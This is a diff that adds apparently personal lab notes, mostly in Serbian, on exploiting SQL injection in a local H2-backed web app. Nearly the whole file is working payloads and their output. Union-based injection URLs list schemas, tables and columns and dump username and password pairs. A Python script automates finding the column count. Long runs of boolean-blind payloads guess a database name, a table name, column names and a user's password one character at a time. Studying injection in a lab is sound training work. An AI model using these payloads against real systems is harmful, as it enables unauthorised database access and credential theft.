@@ -1,0 +1,596 @@
+// Ovime pokusavamo da nadjemo koliko KOLONA ima tabela u kojoj je jedna kolona 'ID'
+
+http://192.168.119.3:8091/?id=-1 union select 1
+http://192.168.119.3:8091/?id=-1 union select 1,2
+http://192.168.119.3:8091/?id=-1 union select 1,2,3        [Dobrodosao, 2!]
+http://192.168.119.3:8091/?id=-1 union select 1,2,3,4
+
+--------------------------------------------------------------------------------
+
+Python script-a za automatizaciju ovog procesa iznad:
+
+python3.12.exe -m pip install requests
+
+
+
+
+
+
+import requests
+
+url = "http://192.168.119.3:8091/"
+found = False
+
+for columns in range(1, 10):  # Try up to 10 columns
+    # Build the payload with current number of columns
+    payload = f"-1 union select {','.join([str(i) for i in range(1, columns+1)])}"
+    params = {'id': payload}
+    
+    try:
+        print(f"[*] Trying {columns} columns with payload: {payload}")
+        response = requests.get(url, params=params)
+        
+        # Look for the number 2 appearing (since your success showed "2")
+        if "2" in response.text and columns == 3:  # Adjust this condition
+            print(f"[+] SUCCESS! Found {columns} columns!")
+            print(f"[+] Working payload: {payload}")
+            found = True
+            break
+            
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if not found:
+    print("[-] Couldn't determine column count automatically. Try manual testing.")
+    
+    # Manual suggestion
+    print("\n[*] Manual test suggestions:")
+    for i in range(1, 6):
+        print(f'   - Try: http://192.168.119.3:8091/?id=-1 union select {",".join(["1"]*i)}')
+
+--------------------------------------------------------------------------------
+
+
+// Saznajemo ime TABELE u kojoj je jedna od KOLONA 'id'(ciji parametar gadjamo)
+http://192.168.119.3:8091/?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=schema()
+[Dobrodosao, PERSON!]
+
+// Saznajemo ime SCHEME(BAZE), tj. same baze
+http://192.168.119.3:8091/?id=-1 UNION SELECT 1, SCHEMA_NAME, 3 FROM INFORMATION_SCHEMA.SCHEMATA
+[Dobrodosao, INFORMATION_SCHEMA!]
+
+// ili ovako(nisam siguran)
+http://192.168.119.3:8091/?id=-1 UNION SELECT 1, CATALOG_NAME, 3 FROM INFORMATION_SCHEMA.SCHEMATA
+
+
+
+
+// Ispisuje sve KOLONE unutar TABELE "PERSON"
+http://192.168.119.3:8091/?id=-1 union select 1, GROUP_CONCAT(column_name), 3 from information_schema.columns where table_name='PERSON'
+[Dobrodosao, ID,USERNAME,PASSWORD!]
+
+
+
+// A mozes i jednu-po-jednu:  (moze i bez LIMIT-a)
+http://192.168.119.3:8091/?id=-1 union select 1, column_name, 3 from information_schema.columns where table_name='PERSON' LIMIT 1 OFFSET 0
+http://192.168.119.3:8091/?id=-1 union select 1, column_name, 3 from information_schema.columns where table_name='PERSON' LIMIT 1 OFFSET 1
+http://192.168.119.3:8091/?id=-1 union select 1, column_name, 3 from information_schema.columns where table_name='PERSON' LIMIT 1 OFFSET 2
+
+// (Respektivan rezultat)
+[Dobrodosao, ID!]
+[Dobrodosao, USERNAME!]
+[Dobrodosao, PASSWORD!]
+
+
+
+// Nadji sve password-e odjednom
+http://192.168.119.3:8091/?id=-1 union select 1, GROUP_CONCAT(PASSWORD), 3 from PERSON LIMIT 1 OFFSET 0
+[Dobrodosao, netflix123,rene,duff,kenny!]
+
+
+
+// Nadji password REDOM, po id-u:
+http://192.168.119.3:8091/?id=-1 union select 1, PASSWORD, 3 from PERSON LIMIT 1 OFFSET 0
+http://192.168.119.3:8091/?id=-1 union select 1, PASSWORD, 3 from PERSON LIMIT 1 OFFSET 1
+http://192.168.119.3:8091/?id=-1 union select 1, PASSWORD, 3 from PERSON LIMIT 1 OFFSET 2
+http://192.168.119.3:8091/?id=-1 union select 1, PASSWORD, 3 from PERSON LIMIT 1 OFFSET 3
+
+// (Respektivan rezultat)
+[Dobrodosao, netflix123!]
+[Dobrodosao, rene!]
+[Dobrodosao, duff!]
+[Dobrodosao, kenny!]
+
+
+// Nadji password za odredjenog korisnika sa imenom <username>
+http://192.168.119.3:8091/?id=-1 union select 1, PASSWORD, 3 from PERSON WHERE USERNAME='erikcartman'
+
+
+
+
+/*
+The first query didn't need `table_schema=schema()` because `GROUP_CONCAT`
+combined all table names from every schema (including system ones like
+`INFORMATION_SCHEMA`) into a single string , while the second query needed the
+filter to return only the user-created tables (like PERSON) one at a time from
+the current schema, excluding the system tables .
+
+*/
+
+
+
+// ------ Saznaj imena SVIH tabela u schemi(cak i generickih) ---
+http://192.168.119.3:8091/?id=-1 union select 1, GROUP_CONCAT(table_name), 3 from information_schema.tables
+
+[Dobrodosao, MAINS,SCHEMATA,COLUMN_PRIVILEGES,HELP,SESSION_STATE,TABLE_PRIVILEGES,REFERENTIAL_CONSTRAINTS,TABLE_TYPES,TABLES,QUERY_STATISTICS,ROLES,SESSIONS,IN_DOUBT,USERS,COLLATIONS,SYNONYMS,TABLE_CONSTRAINTS,INDEXES,PERSON!]
+
+Sve sem "PERSON" postoji u svakoj H2 bazi.
+
+// Sve sto moze da se dobije iz: from information_schema.<nesto-iz-liste>
+
+npr:
+
+// Saznajemo ime TABELE u kojoj je jedna od KOLONA 'id'(ciji parametar gadjamo)
+http://192.168.119.3:8091/?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=schema()
+
+// Ispisuje sve KOLONE unutar TABELE "PERSON"
+http://192.168.119.3:8091/?id=-1 union select 1, GROUP_CONCAT(column_name), 3 from information_schema.columns where table_name='PERSON'
+
+http://192.168.119.3:8091/?id=-1 union select 1, column_name, 3 from information_schema.columns where table_name='PERSON' LIMIT 1 OFFSET 0
+
+
+Ovo su TABELE unutar INFORMATION_SCHEMA
+1.  MAINS                   // Possibly a custom table or alias; not a standard H2 system table
+2.  SCHEMATA                // Lists all schemas (databases) in the system
+3.  COLUMN_PRIVILEGES       // Stores access privileges granted on specific columns
+4.  HELP                    // Contains help information about SQL commands and functions
+5.  SESSION_STATE           // Tracks the state and variables of active database sessions
+6.  TABLE_PRIVILEGES        // Stores access privileges granted on entire tables
+7.  REFERENTIAL_CONSTRAINTS // Defines foreign key relationships between tables
+8.  TABLE_TYPES             // Lists available table types (e.g., 'BASE TABLE', 'VIEW')
+9.  TABLES                  // Contains metadata about every table in the database
+10. QUERY_STATISTICS        // Stores performance statistics about executed queries
+11. ROLES                   // Lists all database roles defined for access control
+12. SESSIONS                // Contains information about current database connections
+13. IN_DOUBT                // Shows transactions that are in an uncertain (prepared) state
+14. USERS                   // Lists all database users and their authentication info
+15. COLLATIONS              // Defines character set and sorting rules available
+16. SYNONYMS                // Stores aliases (synonyms) for tables or views
+17. TABLE_CONSTRAINTS       // Contains all constraints defined on tables (PRIMARY KEY, UNIQUE, etc.)
+18. INDEXES                 // Holds information about all indexes defined on tables
+19. PERSON                  // A user-created table (likely the one containing application data)
+
+
+// Na ovom sajtu ima da se nadje koje sve KOLONE unutar "information_schema" postoje
+(npr. "table_name", "column_name", itd.)
+
+https://h2database.com/html/systemtables.html#columns
+
+
+"INFORMATION_SCHEMA" je specijalna schema koja je default-na, standardizovan
+sistem kataloga u H2(ali i vecini ostalih SQL baza), i sadrzi metapodatke o
+samoj bazi.
+
+
+SCHEMATA je jednostavna system-table(lista) koja sadrzi imena SVIH baza(schemas)
+koje su dostupne na datom server-u.
+
+
+INFORMATION_SCHEMA je specijalna schema(baza kao baza_januar2026.sql) koja je
+default-na i standardirzovan i to je sistem kataloga u H2(ali i vecini ostalih
+SQL baza), i sadrzi metapodatke o samoj bazi.
+
+SCHEMATA je jedna od mnogih default-nih TABELA unutar INFORMATION_SCHEMA.
+
+
+Zbog toga pisemo ovako:
+// Saznajemo ime SCHEME(BAZE), tj. same baze
+http://192.168.119.3:8091/?id=-1 UNION SELECT 1, SCHEMA_NAME, 3 FROM INFORMATION_SCHEMA.SCHEMATA
+http://192.168.119.3:8091/?id=-1 UNION SELECT 1, SCHEMA_OWNER, 3 FROM INFORMATION_SCHEMA.SCHEMATA
+http://192.168.119.3:8091/?id=-1 UNION SELECT 1, CATALOG_NAME, 3 FROM INFORMATION_SCHEMA.SCHEMATA
+
+
+When you hit Enter, your browser sends the full URL string including 'schema()'
+to the web server, which passes it untouched into the SQL query; then the H2
+database engine's parser receives the complete SQL command, recognizes
+'schema()' as a built-in function , and immediately executes it during query
+processing to substitute the current schema name before executing the 'WHERE'
+clause and returning results.
+
+Built-in in the H2 database engine itself, meaning `schema()` is a function that
+is part of H2's core software and is automatically available in any SQL query
+you run against that database.
+
+
+
+
+
+--------------------------------------------------------------------------------
+`schema()` returns the name of the default schema for the current session, which
+in H2 is typically `PUBLIC` (unless you've created or are using another one).
+
+--------------------------------------------------------------------------------
+
+Vezba 1.2
+
+// Ako hocemo samo trenutnu bazu, onda mora: table_schema=schema()--
+// INFORMATION_SCHEMA.TABLES su sve TABELE, poput "PERSON", "PRODUCTS", itd.
+
+// Naci koje sve TABELE postoje u "sistemdb.sql"
+' and false union select 1,table_name from INFORMATION_SCHEMA.TABLES  where table_schema=schema()--
+
+Naziv	Cena
+1	$PRODUCTS
+1	$USERS
+
+
+
+// Naci ime base
+' and false union select 1,CATALOG_NAME from INFORMATION_SCHEMA.SCHEMATA--
+
+Naziv	Cena
+1	$SISTEMDB
+
+
+
+
+
+
+// Pronaci imena svih kolona svih tabela koje koristi stranica
+' and false union select 1,column_name from INFORMATION_SCHEMA.COLUMNS  where table_schema=schema()--
+
+// Ne moraju da budu po redu.
+Naziv	Cena
+1	$ID
+1	$NAME
+1	$PASSWORD
+1	$PRICE
+1	$USERNAME
+
+
+
+// Nadji koje KOLONE ima TABELA "PRODUCTS"
+' and false union select 1,column_name from INFORMATION_SCHEMA.COLUMNS  where table_schema=schema() and table_name='PRODUCTS'--
+' and false union select 1,column_name from INFORMATION_SCHEMA.COLUMNS  where table_name='PRODUCTS'--
+
+Naziv	Cena
+1	$NAME
+1	$PRICE
+
+
+
+
+
+// Nadji koje KOLONE ima TABELA "USERS"
+' and false union select 1,column_name from INFORMATION_SCHEMA.COLUMNS  where table_schema=schema() and table_name='USERS'--
+
+
+Naziv	Cena
+1	$ID
+1	$PASSWORD
+1	$USERNAME
+
+
+// Nadji lozinke svih
+' and false union select PASSWORD,USERNAME from USERS--
+
+Naziv	Cena
+genius	$shop2
+lenovo	$admin
+razer	$shop1
+
+
+// Ili ovako, sve odjednom, sa ' | ' separatorom.
+' and false union select 1, GROUP_CONCAT(CONCAT(USERNAME, ':', PASSWORD) SEPARATOR ' | ') from USERS--
+
+
+Naziv	Cena
+1	$shop1:razer | shop2:genius | admin:lenovo
+
+
+
+// ili ovako:
+' and false union select 1, CONCAT(USERNAME, ':', PASSWORD) from USERS--
+
+Naziv	Cena
+1	$admin:lenovo
+1	$shop1:razer
+1	$shop2:genius
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+
+Vezba 2
+
+// Pazi na "or"
+' or 1=1--
+
+// Ne valja
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 1--
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 2--
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 3--
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 4--
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 5--
+
+// POGODAK!
+' or select 1 from information_schema.schemata where schema_name=schema() and length(catalog_name) = 6--
+
+
+// Prvo slovo
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,1) = 'A'--
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,1) = 'B'--               pogodak
+
+// ili
+' or (select 1 from information_schema.schemata where schema_name=schema() and ascii(substring(catalog_name,1,1)) = 97)--
+' or (select 1 from information_schema.schemata where schema_name=schema() and ascii(substring(catalog_name,1,1)) = 98)--       pogodak
+
+
+
+// Drugo slovo
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,2) = 'BA'--              pogodak
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,2) = 'BZ'--
+
+
+
+
+// Trece slovo
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,3) = 'BAA'--
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,3) = 'BAZ'--
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,3) = 'BAM'--             pogodak
+
+
+
+
+// Cetvrto slovo
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,4) = 'BAMA'--
+' or select 1 from information_schema.schemata where schema_name=schema() and substring(catalog_name,1,4) = 'BAMB'--            pogodak
+
+
+
+
+// Ako mislis da znas celo onda:
+' or select 1 from information_schema.schemata where schema_name=schema() and catalog_name = 'BAZA24'--
+' or select 1 from information_schema.schemata where schema_name=schema() and catalog_name = 'BAZA25'--
+' or select 1 from information_schema.schemata where schema_name=schema() and catalog_name = 'BAZA26'--
+' or select 1 from information_schema.schemata where schema_name=schema() and catalog_name = 'BAMBUS'--                          pogodak
+
+
+
+
+// Da li je broj TABELA unutar "BAMBUS.sql" baze jednak 1?
+' or select 1 from information_schema.tables where table_schema=schema() and (select count(*) from information_schema.tables where table_schema=schema() = 1)--     pogodak
+' or select 1 from information_schema.tables where table_schema=schema() and (select count(*) from information_schema.tables where table_schema=schema() = 2)--
+
+
+Koristeći prethodno saznanje, pronaći dužinu imena tabele, a zatim i samo ime koristeći sledeće:
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 1--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'A'--
+
+
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 1--
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 2--
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 3--
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 4--
+' or select 1 from information_schema.tables where table_schema=schema() and length(table_name) = 5--   pogodak
+
+
+
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'A'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'B'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'C'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'D'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'E'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'F'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'G'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'H'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'I'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'J'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'K'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'L'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'M'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'N'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'O'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'P'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'Q'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'R'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'S'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'T'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'U'--   pogodak
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'V'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'W'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'X'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'Y'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,1) = 'Z'--
+
+
+// Prva cetiri
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,4) = 'USER'--     pogodak
+
+// SVih pet
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,5) = 'USERZ'--
+' or select 1 from information_schema.tables where table_schema=schema() and substring(table_name,1,5) = 'USERS'--    pogodak
+
+
+
+
+
+
+
+
+// Nakon pronalaska imena tabele, potrebno je pronaci ime kolone u kojoj se
+cuvaju lozinke. Uneti sledecu vrednost u polje za staru lozinku:
+
+// Pokusavamo da saznamo koliko KOLONA postoji unutar "USERS" tabele
+' or (select count(*) from information_schema.columns where table_name = 'USERS' and table_schema = schema()) = 1--
+' or (select count(*) from information_schema.columns where table_name = 'USERS' and table_schema = schema()) = 2--
+' or (select count(*) from information_schema.columns where table_name = 'USERS' and table_schema = schema()) = 3--   pogodak
+
+
+// Sad trazimo duzinu imena same KOLONE unutar tabele USERS
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 1--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 3--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 4--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 5--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 6--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 7--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 8--
+
+
+
+' or (select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 8 and ORDINAL_POSITION = 1)--
+' or (select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 8 and ORDINAL_POSITION = 2)--  POGODAK
+' or (select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 8 and ORDINAL_POSITION = 3)--  POGODAK
+' or (select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and length(column_name) = 8 and ORDINAL_POSITION = 6)--
+
+
+
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'A' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'B' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'C' and ORDINAL_POSITION = 2--
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'D' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'd' and ORDINAL_POSITION = 2--
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'E' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'F' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'G' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'H' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'I' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'J' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'K' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'L' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'M' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'N' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'O' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'P' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'Q' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'R' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'S' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'T' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'U' and ORDINAL_POSITION = 2--  POGODAK
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'V' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'W' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'X' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'Y' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,1) = 'Z' and ORDINAL_POSITION = 2--
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UA' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UB' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UC' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UD' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UE' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UF' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UG' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UH' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UI' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UJ' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UK' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UL' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UM' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UN' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UO' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UP' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UQ' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UR' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'US' and ORDINAL_POSITION = 2-- POGODAK
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UT' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UU' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UV' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UW' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UX' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UY' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,2) = 'UZ' and ORDINAL_POSITION = 2--
+
+
+
+// ORDINAL je 2
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,4) = 'USEX' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,4) = 'USER' and ORDINAL_POSITION = 2-- POGODAK
+
+
+
+// ORDINAL je 3
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,4) = 'PASR' and ORDINAL_POSITION = 3--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,4) = 'PASS' and ORDINAL_POSITION = 3-- POGODAK
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'PASSW' and ORDINAL_POSITION = 3-- POGODAK
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,8) = 'PASSWORX' and ORDINAL_POSITION = 3--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,8) = 'PASSWORD' and ORDINAL_POSITION = 3-- POGODAK
+
+
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER0' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER1' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER2' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER3' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER4' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER5' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER6' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER7' and ORDINAL_POSITION = 2--
+' or select 1 from information_schema.columns where table_name='USERS' and table_schema = schema() and substring(column_name,1,5) = 'USER_' and ORDINAL_POSITION = 2--
+
+// I kad znamo ime korisnika, onda brute-forceujemo password:
+' or select 1 from TABLE where COL1='dogwhisperer' and length(COL2) = 1--
+' or select 1 from TABLE where COL1='dogwhisperer' and substring(COL2,1,1) = 'a'--
+
+
+
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 1--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 2--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 3--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 4--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 5--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 6--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 7--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 8--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 9--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 10--
+' or select 1 from USERS where USER='dogwhisperer' and length(PASSWORD) = 11--
+
+
+
+// A onda treba naci:
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'a'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'b'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'c'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'd'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'e'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'f'--
+' or select 1 from USERS where USER='dogwhisperer' and substring(PASSWORD,1,1) = 'g'--
